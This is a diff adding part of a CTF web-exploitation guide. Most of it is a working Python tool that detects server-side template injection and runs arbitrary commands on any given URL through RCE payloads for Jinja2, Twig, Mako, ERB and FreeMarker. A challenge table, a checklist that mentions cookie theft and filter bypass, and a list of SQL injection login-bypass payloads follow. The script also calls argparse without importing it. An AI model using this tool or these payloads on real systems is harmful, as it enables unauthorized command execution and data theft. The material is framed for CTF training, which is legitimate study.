+import sys
+import re
+import requests
+from dataclasses import dataclass
+from typing import Optional
+
+
+HEADERS = {"User-Agent": "Mozilla/5.0 (CTF-Lab/1.0)"}
+
+
+@dataclass
+class SstiConfig:
+    url: str
+    param: str
+    method: str = "GET"
+    engine: str = "auto"
+    timeout: int = 10
+    cookies: dict[str, str] | None = None
+    extra_data: dict[str, str] | None = None
+
+
+# Detection payloads: (payload, expected response, engine hint)
+DETECT_PAYLOADS: list[tuple[str, str, str]] = [
+    ("{{7*7}}", "49", "jinja2/twig"),
+    ("${7*7}", "49", "mako/freemarker"),
+    ("{{7*'7'}}", "7777777", "jinja2"),
+    ("{{7*'7'}}", "49", "twig"),
+    ("<%= 7*7 %>", "49", "erb"),
+    ("#{7*7}", "49", "unknown"),
+]
+
+RCE_PAYLOADS: dict[str, list[str]] = {
+    "jinja2": [
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}",
+        "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
+    ],
+    "twig": [
+        "{{['id']|filter('system')}}",
+        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+    ],
+    "mako": [
+        "<%import os%>${os.popen('id').read()}",
+        "${__import__('os').popen('id').read()}",
+    ],
+    "erb": [
+        "<%= `id` %>",
+        "<%= system('id') %>",
+    ],
+    "freemarker": [
+        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
+    ],
+}
+
+
+def send_payload(cfg: SstiConfig, payload: str) -> Optional[str]:
+    """Send payload and return response."""
+    session = requests.Session()
+    session.headers.update(HEADERS)
+
+    params_or_data = dict(cfg.extra_data or {})
+    params_or_data[cfg.param] = payload
+
+    try:
+        if cfg.method.upper() == "GET":
+            resp = session.get(cfg.url, params=params_or_data,
+                               timeout=cfg.timeout,
+                               cookies=cfg.cookies or {})
+        else:
+            resp = session.post(cfg.url, data=params_or_data,
+                                timeout=cfg.timeout,
+                                cookies=cfg.cookies or {})
+        return resp.text
+    except requests.RequestException as e:
+        print(f"[-] Request error: {e}", file=sys.stderr)
+        return None
+
+
+def detect_engine(cfg: SstiConfig) -> Optional[str]:
+    """Automatically detect template engine."""
+    print("[*] Detecting SSTI engine...")
+
+    for payload, expected, engine_hint in DETECT_PAYLOADS:
+        result = send_payload(cfg, payload)
+        if result and expected in result:
+            print(f"[+] SSTI detected! Payload: {payload!r}")
+            print(f"    Expected result: {expected!r} / confirmed in actual response")
+            print(f"    Estimated engine: {engine_hint}")
+            # Distinguish jinja2/twig
+            if "jinja2/twig" in engine_hint:
+                r2 = send_payload(cfg, "{{7*'7'}}")
+                if r2 and "7777777" in r2:
+                    return "jinja2"
+                elif r2 and "49" in r2:
+                    return "twig"
+            return engine_hint.split("/")[0]
+
+    print("[-] SSTI detection failed")
+    return None
+
+
+def exploit_rce(cfg: SstiConfig, engine: str, cmd: str) -> Optional[str]:
+    """Execute a command via RCE payload."""
+    payloads = RCE_PAYLOADS.get(engine, [])
+    if not payloads:
+        print(f"[-] No RCE payload for {engine}", file=sys.stderr)
+        return None
+
+    for template_payload in payloads:
+        # Replace command
+        payload = template_payload.replace("id", cmd)
+        print(f"[*] Trying: {payload[:80]}...")
+        result = send_payload(cfg, payload)
+        if result:
+            # Search for uid= pattern or flag pattern
+            uid_match = re.search(r"uid=\d+", result)
+            flag_match = re.search(r"(?:CTF|FLAG|flag)\{[^}]+\}", result)
+            if uid_match or flag_match:
+                target = flag_match.group() if flag_match else uid_match.group()  # type: ignore[union-attr]
+                print(f"[+] Command execution successful: {target}")
+                return result
+
+    return None
+
+
+def extract_flag(cfg: SstiConfig, engine: str) -> Optional[str]:
+    """Automatically search for and extract flag files."""
+    flag_paths = ["/flag", "/flag.txt", "/home/ctf/flag", "/root/flag.txt"]
+
+    for path in flag_paths:
+        cmd = f"cat {path}"
+        print(f"[*] Searching for flag: {path}")
+        result = exploit_rce(cfg, engine, cmd)
+        if result:
+            flag_match = re.search(r"(?:CTF|FLAG|flag|[A-Z]+)\{[^}]+\}", result)
+            if flag_match:
+                return flag_match.group()
+            print(f"    Response: {result.strip()[:100]}")
+
+    return None
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="SSTI Detection and RCE Automation",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument("--url", required=True, help="Target URL")
+    parser.add_argument("--param", required=True, help="SSTI vulnerable parameter")
+    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
+    parser.add_argument(
+        "--engine",
+        choices=["auto", "jinja2", "twig", "mako", "erb", "freemarker"],
+        default="auto",
+        help="Template engine (default: auto detection)",
+    )
+    parser.add_argument("--cmd", default="id", help="Command to execute (default: id)")
+    parser.add_argument("--detect-only", action="store_true", help="Detection only")
+    parser.add_argument("--find-flag", action="store_true", help="Automatically search for flag")
+    parser.add_argument("--cookie", default="", help="Cookie string")
+
+    args = parser.parse_args()
+
+    cookies: dict[str, str] = {}
+    if args.cookie:
+        for kv in args.cookie.split(";"):
+            kv = kv.strip()
+            if "=" in kv:
+                k, v = kv.split("=", 1)
+                cookies[k] = v
+
+    cfg = SstiConfig(
+        url=args.url,
+        param=args.param,
+        method=args.method,
+        engine=args.engine,
+        cookies=cookies or None,
+    )
+
+    print(f"[*] Target: {cfg.url} (parameter: {cfg.param})")
+
+    # Determine engine
+    engine: Optional[str]
+    if args.engine == "auto":
+        engine = detect_engine(cfg)
+        if not engine:
+            sys.exit(1)
+    else:
+        engine = args.engine
+        print(f"[*] Engine specified: {engine}")
+
+    if args.detect_only:
+        print(f"[+] Detection complete: {engine}")
+        sys.exit(0)
+
+    # Automatic flag search
+    if args.find_flag:
+        flag = extract_flag(cfg, engine)
+        if flag:
+            print(f"\n[+] Flag: {flag}")
+        else:
+            print("[-] Flag search failed")
+            sys.exit(1)
+    else:
+        # Execute single command
+        result = exploit_rce(cfg, engine, args.cmd)
+        if result:
+            print(f"\n[+] Result:\n{result}")
+        else:
+            print("[-] RCE failed")
+            sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. Scoreboard and Learning Checklist
+
+### 6.1 Challenge Table by Difficulty
+
+| # | Challenge | Vulnerability | Difficulty | Score | Key Technique | Estimated Time |
+|---|-----------|--------------|------------|-------|---------------|----------------|
+| 1 | Login Bypass | SQL Injection (error-based) | Easy | 100 | `' OR 1=1--` | 15 min |
+| 2 | Data Leak | SQL Injection (UNION) | Easy | 150 | UNION SELECT | 20 min |
+| 3 | Blind Flag | SQL Injection (Boolean Blind) | Medium | 250 | Binary search | 45 min |
+| 4 | Time Bomb | SQL Injection (Time-based) | Medium | 300 | SLEEP() | 60 min |
+| 5 | Reflector | Reflected XSS | Easy | 100 | Basic `<script>` | 15 min |
+| 6 | Board Hack | Stored XSS | Medium | 200 | Cookie theft | 30 min |
+| 7 | CSP Bypass | XSS + CSP bypass | Hard | 400 | JSONP, nonce | 90 min |
+| 8 | DOM Pwn | DOM XSS | Hard | 350 | innerHTML sink | 60 min |
+| 9 | Inner Reach | SSRF (basic) | Medium | 250 | Internal IP access | 30 min |
+| 10 | AWS Leak | SSRF + metadata | Hard | 450 | IMDSv2 bypass | 90 min |
+| 11 | Template Fun | SSTI (Jinja2) | Medium | 300 | `{{7*7}}` | 45 min |
+| 12 | RCE Master | SSTI → RCE | Hard | 500 | Subclass chain | 120 min |
+| 13 | Chain Attack | SQLi + SSRF chained | Insane | 800 | Combined | 180 min |
+| 14 | Full Pwn | XSS + CSRF + SSRF | Insane | 1000 | Full chain | 240 min |
+
+### 6.2 Learning Checklist
+
+**SQL Injection**
+
+- [ ] Can manually detect error-based SQLi
+- [ ] Determine column count and extract data via UNION SELECT
+- [ ] Manually implement Boolean Blind SQLi (binary search)
+- [ ] Use SLEEP() for time-based SQLi
+- [ ] Understand second-order SQLi (store then execute)
+- [ ] Know at least 3 WAF bypass techniques
+- [ ] Proficient with sqlmap basic and advanced options
+
+**XSS**
+
+- [ ] Distinguish Reflected / Stored / DOM XSS
+- [ ] Memorize more than 10 payloads beyond `<script>alert(1)</script>`
+- [ ] Write cookie theft payloads and operate a receiver server
+- [ ] Analyze CSP headers and apply bypass techniques
+- [ ] Bypass filters/WAF (mixed case, event handlers, encoding)
+- [ ] Basic use of BeEF (Browser Exploitation Framework)
+
+**SSRF**
+
+- [ ] Know SSRF vulnerable endpoint detection patterns
+- [ ] Know internal IP ranges (169.254.169.254, 10.x, 192.168.x)
+- [ ] Memorize AWS / GCP / Azure metadata paths
+- [ ] IP encoding bypass (decimal, hex, abbreviated form)
+- [ ] Understand DNS rebinding attack principles
+- [ ] Experience building SSRF → RCE chains
+
+**SSTI**
+
+- [ ] Know detection payloads like `{{7*7}}`, `${7*7}`, etc.
+- [ ] Understand how to distinguish Jinja2 / Twig / Mako engines
+- [ ] Achieve RCE via Jinja2 subclass chain
+- [ ] Apply underscore filter bypass techniques
+- [ ] Basic use of SSTImap tool
+
+**综合**
+
+- [ ] Perform automated fuzzing with Burp Suite Intruder
+- [ ] Discover parameters and endpoints with ffuf
+- [ ] Write custom exploits with Python requests
+- [ ] Experience writing vulnerability reports (with reproduction steps)
+- [ ] Solve more than 10 challenges on CTF platforms (HackTheBox, TryHackMe, picoCTF)
+
+---
+
+## Appendix: Quick Reference Payload Collection
+
+### SQL Injection
+
+```
+# Login bypass
+' OR '1'='1
+' OR 1=1--
+admin'--
+' OR 'x'='x
+
+# UNION
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+# Comment variations
 --
 #
 /**/
